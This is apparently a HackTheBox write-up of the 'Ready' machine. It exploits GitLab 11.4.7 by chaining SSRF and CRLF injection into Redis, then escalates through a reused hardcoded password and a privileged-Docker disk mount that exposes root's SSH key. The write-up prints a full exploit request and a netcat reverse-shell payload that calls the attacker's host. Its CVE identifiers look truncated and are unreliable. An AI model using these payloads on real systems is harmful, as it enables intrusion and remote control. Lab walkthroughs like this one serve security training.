---
Category:
  - B2R
Difficulty: Medium
Platform: HackTheBox
Status: 3. Complete
tags: [CRLF-injection, GitLab, SSRF, credentials-reuse, docker-breakout, hardcoded-credentials, redis, Linux]
---
# Introduction

>[!summary]
>**Ready** is a medium difficulty Linux box based on a vulnerable version of **GitLab Community Edition**, which suffers both a **Server Side Request Forgery** (CVE-2018-1957) and a **CRLF injection** (CVE-2018-195), allowing to obtain a reverse shell as git user. After obtained a foothold, internal enumeration allowed to find **hardcoded-credentials** which lead to root access inside the docker container. Docker’s root user was allowed to run **fdisk** and **mount the external system**, making possible to stole root ssh key and obtain a high privileged shell on the original target.

## Improved skills

- SSRF Attacks
- CRLF Attacks
- Docker Escape

## Used tools

- nmap
- burpsuite
- hackvector
- netcat

---

# Enumeration

Enumerated all TCP ports:

```bash
┌──(kali㉿kali)-[~/CTFs/HTB/box/Ready]
└─$ sudo nmap -p- -sS 10.10.10.220 -oN scans/all-tcp-ports.txt -v
[sudo] password for kali:
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-29 15:58 EDT
Initiating Ping Scan at 15:58
Scanning 10.10.10.220 [4 ports]
Completed Ping Scan at 15:58, 0.10s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 15:58
Completed Parallel DNS resolution of 1 host. at 15:58, 0.01s elapsed
Initiating SYN Stealth Scan at 15:58
Scanning 10.10.10.220 [65535 ports]
Discovered open port 22/tcp on 10.10.10.220
Discovered open port 5080/tcp on 10.10.10.220
Completed SYN Stealth Scan at 15:59, 40.66s elapsed (65535 total ports)
Nmap scan report for 10.10.10.220
Host is up (0.059s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
5080/tcp open  onscreen

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 40.94 seconds
           Raw packets sent: 65582 (2.886MB) | Rcvd: 65536 (2.621MB)
```

Enumerated open TCP ports:

```bash
┌──(kali㉿kali)-[~/CTFs/HTB/box/Ready]
└─$ sudo nmap -p22,5080 -sV -sT -sC -A 10.10.10.220 -oN scans/open-tcp-ports.txt
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-29 16:02 EDT
Nmap scan report for 10.10.10.220
Host is up (0.051s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
5080/tcp open  http    nginx
| http-robots.txt: 53 disallowed entries (15 shown)
| / /autocomplete/users /search /api /admin /profile
| /dashboard /projects/new /groups/new /groups/*/edit /users /help
|_/s/ /snippets/new /snippets/*/edit
| http-title: Sign in \xC2\xB7 GitLab
|_Requested resource was http://10.10.10.220:5080/users/sign_in
|_http-trane-info: Problem with XML parsing of /evox/about
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using proto 1/icmp)
HOP RTT      ADDRESS
1   49.83 ms 10.10.14.1
2   49.93 ms 10.10.10.220

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.69 seconds
```

Nmap revealed a GitLab installation on port 5080 and a OpenSSH service on port 22.

![Pasted image 20210429220414.png](../../zzz_res/attachments/Pasted_image_20210429220414.png)

A custom account was registered in order to access the GitLab instance: 

![Pasted image 20210429220624.png](../../zzz_res/attachments/Pasted_image_20210429220624.png)

After get logged in, GitLab Version was enumerated from the “help” page:

![Pasted image 20210429220855.png](../../zzz_res/attachments/Pasted_image_20210429220855.png)

# Foothold

Googling around was found that **GitLab Community Edition 11.4.7** suffered a Remote Code Execution vulnerability caused by a **Server Side Request Forgery** (CVE-2018-1957) and a **CRFL Injection** (CVE-2018-195).

Among the various PoCs, the [analysis](https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/) conducted by **liveoverflow** was definitely one of the best choice to follow to be able to penetrate this machine.

[GitLab 11.4.7 Remote Code Execution](https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/)

To summarize the vulnerability, arbitrary code execution can be achieved **importing a new git project** from the **redis** localhost port abusing a **SSRF** vulnerability in conjunction with the **CRLF injection**. This combination of vulnerabilities allowed to **execute arbitrary code inside redis** and so obtain a reverse shell.

First, a test project was created and the corresponding *import* request was intercepted using burpsuite:

![Pasted image 20210429225050.png](../../zzz_res/attachments/Pasted_image_20210429225050.png)

```http
POST /projects HTTP/1.1
Host: 10.10.10.220:5080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.220:5080/projects/new
Content-Type: application/x-www-form-urlencoded
Content-Length: 317
Origin: http://10.10.10.220:5080
Connection: close
Cookie: _gitlab_session=09091cb83a47305f01ddec7c77a45d15; sidebar_collapsed=true; event_filter=all
Upgrade-Insecure-Requests: 1

utf8=%E2%9C%93&authenticity_token=aftxcmnuS8Omyy8hNlcAIh1FS4bve7Ynayo4MGngN2PDRqLqEX40n3qKOSG9ZTLRNR9rxOakhyzSTKGlyqrl6Q%3D%3D&project%5Bimport_url%5D=test&project%5Bci_cd_only%5D=false&project%5Bname%5D=test&project%5Bnamespace_id%5D=3&project%5Bpath%5D=test&project%5Bdescription%5D=&project%5Bvisibility_level%5D=0
```

After that, the request was modified to contain the malicious payload, which in this case send to the attacker machine the string “pippo”. To avoid problems with special characters the url-encode of the whole payload was executed using the burpsuite plugin *hackvector*.

```http
POST /projects HTTP/1.1
Host: 10.10.10.220:5080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.220:5080/projects/new
Content-Type: application/x-www-form-urlencoded
Content-Length: 772
Origin: http://10.10.10.220:5080
Connection: close
Cookie: _gitlab_session=09091cb83a47305f01ddec7c77a45d15; sidebar_collapsed=true; event_filter=all
Upgrade-Insecure-Requests: 1

utf8=%E2%9C%93&authenticity_token=aftxcmnuS8Omyy8hNlcAIh1FS4bve7Ynayo4MGngN2PDRqLqEX40n3qKOSG9ZTLRNR9rxOakhyzSTKGlyqrl6Q%3D%3D&project%5Bimport_url%5D=<@urlencode_all>git://[0:0:0:0:0:ffff:127.0.0.1]:6379/
 multi
 sadd resque:gitlab:queues system_hook_push
 lpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\",\"args\":[\"class_eval\",\"open(\'|echo pippo | nc 10.10.14.24 1234\').read\"],\"retry\":3,\"queue\":\"system_hook_push\",\"jid\":\"ad52abc5641173e217eb2e52\",\"created_at\":1513714403.8122594,\"enqueued_at\":1513714403.8129568}"
 exec
 exec
/ssrf.git <@/urlencode_all>&project%5Bci_cd_only%5D=false&project%5Bname%5D=test&project%5Bnamespace_id%5D=3&project%5Bpath%5D=test&project%5Bdescription%5D=&project%5Bvisibility_level%5D=0
```

![Pasted image 20210429225435.png](../../zzz_res/attachments/Pasted_image_20210429225435.png)

The resulting request was the following one:

![Pasted image 20210429225703.png](../../zzz_res/attachments/Pasted_image_20210429225703.png)

Listening on port 1234 we get a response back from the server with the message contained within the payload, meaning that the exploit was successfully executed.

```bash
┌──(kali㉿kali)-[~/CTFs/HTB/box/Ready]
└─$ sudo nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.10.14.24] from (UNKNOWN) [10.10.10.220] 39212
pippo
```

A reverse connection can be obtained in the same way upgrading the previous PoC to contain a netcat reverse shell:

```bash
<@urlencode_all>git://[0:0:0:0:0:ffff:127.0.0.1]:6379/
 multi
 sadd resque:gitlab:queues system_hook_push
 lpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\",\"args\":[\"class_eval\",\"open(\'| nc 10.10.14.24 1234 -e /bin/bash\').read\"],\"retry\":3,\"queue\":\"system_hook_push\",\"jid\":\"ad52abc5641173e217eb2e52\",\"created_at\":1513714403.8122594,\"enqueued_at\":1513714403.8129568}"
 exec
 exec
/ssrf.git <@/urlencode_all>
```

Using the above payload, a reverse shell was obtained successfully:

```bash
┌──(kali㉿kali)-[~/CTFs/HTB/box/Ready]
└─$ sudo nc -nlvp 1234
[sudo] password for kali:
listening on [any] 1234 ...
connect to [10.10.14.24] from (UNKNOWN) [10.10.10.220] 39772

id
uid=998(git) gid=998(git) groups=998(git)
which python
which python3
/opt/gitlab/embedded/bin/python3
python3 -c 'import pty; pty.spawn("/bin/bash")'
git@gitlab:~/gitlab-rails/working$ cd /home
cd /home
git@gitlab:/home$ ls
ls
dude
git@gitlab:/home$ cd dude
cd dude
git@gitlab:/home/dude$ ls
ls
user.txt
git@gitlab:/home/dude$ cat user.txt
cat user.txt
e1e30b052b6ec0670698805d745e7682
```

## Lateral Movement

Local enumeration revealed a **readable backup file** containing credentials and a docker-compose suggesting we were inside docker:

```bash
git@gitlab:/opt/backup$ cat gitlab.rb | grep password
#### Email account password
# gitlab_rails['incoming_email_password'] = "[REDACTED]"
#     password: '_the_password_of_the_bind_user'
#     password: '_the_password_of_the_bind_user'
#   '/users/password',
#### Change the initial default admin password and shared runner registration tokens.
# gitlab_rails['initial_root_password'] = "password"
# gitlab_rails['db_password'] = nil
# gitlab_rails['redis_password'] = nil
gitlab_rails['smtp_password'] = "wW59U!ZKMbG9+*#h"
# gitlab_shell['http_settings'] = { user: 'username', password: 'password', ca_file: '/etc/ssl/cert.pem', ca_path: '/etc/pki/tls/certs', self_signed_cert: false}
##! `SQL_USER_PASSWORD_HASH` can be generated using the command `gitlab-ctl pg-password-md5 gitlab`
# postgresql['sql_user_password'] = 'SQL_USER_PASSWORD_HASH'
# postgresql['sql_replication_password'] = "md5 hash of postgresql password" # You can generate with `gitlab-ctl pg-password-md5 <dbuser>`
# redis['password'] = 'redis-password-goes-here'
####! **Master password should have the same value defined in
####!   redis['password'] to enable the instance to transition to/from
# redis['master_password'] = 'redis-password-goes-here'
# geo_secondary['db_password'] = nil
# geo_postgresql['pgbouncer_user_password'] = nil
#     password: PASSWORD
###! generate this with `echo -n '$password + $username' | md5sum`
# pgbouncer['auth_query'] = 'SELECT username, password FROM public.pg_shadow_lookup($1)'
#     password: MD5_PASSWORD_HASH
# postgresql['pgbouncer_user_password'] = nil

git@gitlab:/opt/backup$ cat docker-compose.yml 
version: '2.4'

services:
  web:
    image: 'gitlab/gitlab-ce:11.4.7-ce.0'
    restart: always
    hostname: 'gitlab.example.com'
    environment:
      GITLAB_OMNIBUS_CONFIG: |
        external_url 'http://172.19.0.2'
        redis['bind']='127.0.0.1'
        redis['port']=6379
        gitlab_rails['initial_root_password']=File.read('/root_pass')
		...
		privileged: true
		...
```

Because `root` used the same password, it was possible to escalate to root reusing it:

```bash
git@gitlab:/opt/backup$ su root
Password: 
root@gitlab:/opt/backup# id                                   
uid=0(root) gid=0(root) groups=0(root)
```

## Privilege Escalation

Because the container had the **privileged** flag set to **true** and root access was gained, it was possible to escape from it and get access on the original target mounting the corresponding partition.

A PoC of the method can be read on the HackTricks blog: [Docker Basics & Breakout](https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout#i-own-root)

Enumerated all the partition using `fdisk` and mounted the target filesystem inside the container:

```bash
root@gitlab:/mnt# fdisk -l
...
Device        Start      End  Sectors Size Type
/dev/sda1      2048     4095     2048   1M BIOS boot
/dev/sda2      4096 37746687 37742592  18G Linux filesystem
/dev/sda3  37746688 41940991  4194304   2G Linux swap
root@gitlab:/mnt# mount /dev/sda2 /mnt/tmp/

root@gitlab:/mnt# mkdir tmp
root@gitlab:/mnt# mount /dev/sda2 /mnt/tmp/
```

Leaked the root private key:

```bash
root@gitlab:/mnt/tmp/root# ls
docker-gitlab  ready-channel  root.txt  snap
root@gitlab:/mnt/tmp/root# cd .ssh
root@gitlab:/mnt/tmp/root/.ssh# ls
authorized_keys  id_rsa  id_rsa.pub
root@gitlab:/mnt/tmp/root/.ssh# cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAvyovfg++zswQT0s4YuKtqxOO6EhG38TR2eUaInSfI1rjH09Q
...
aKvV8jR1G+70v4GVye79Kk7TL5uWFDFWzVPwVID9QCYJjuDlLBaFDnUOYFZW52gz
vJzok/kcmwcBlGfmRKxlS0O6n9dAiOLY46YdjyS8F8hNPOKX6rCd
-----END RSA PRIVATE KEY-----
```

Obtained a high privileged shell using the stolen key:

```bash
┌──(kali㉿kali)-[~/CTFs/HTB/box/Ready]
└─$ nano loot/root.rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAvyovfg++zswQT0s4YuKtqxOO6EhG38TR2eUaInSfI1rjH09Q
sle1ivGnwAUrroNAK48LE70Io13DIfE9rxcotDviAIhbBOaqMLbLnfnnCNLApjCn
...

┌──(kali㉿kali)-[~/CTFs/HTB/box/Ready]
└─$ ssh root@10.10.10.220 -i loot/root.rsa
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-40-generic x86_64)
...
Last login: Thu Feb 11 14:28:18 2021
root@ready:~# whoami && hostname && cat /root/root.txt && ifconfig -a
root
ready
b7f98681505cd39066f67147b103c2b3
br-bcb73b090b3f: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.19.0.1  netmask 255.255.0.0  broadcast 172.19.255.255
        inet6 fe80::42:28ff:fe4d:2cbf  prefixlen 64  scopeid 0x20<link>
        ether 02:42:28:4d:2c:bf  txqueuelen 0  (Ethernet)
		...
```

![Pasted image 20210430005722.png](../../zzz_res/attachments/Pasted_image_20210430005722.png)

# Trophy

>[!quote]
>The good thing about science is that it's true whether or not you believe in it.
>
>\- Neil deGrasse Tyson

>[!success]
>**User.txt**
>e1e30b052b6ec0670698805d745e7682

>[!success]
>**Root.txt**
>b7f98681505cd39066f67147b103c2b3

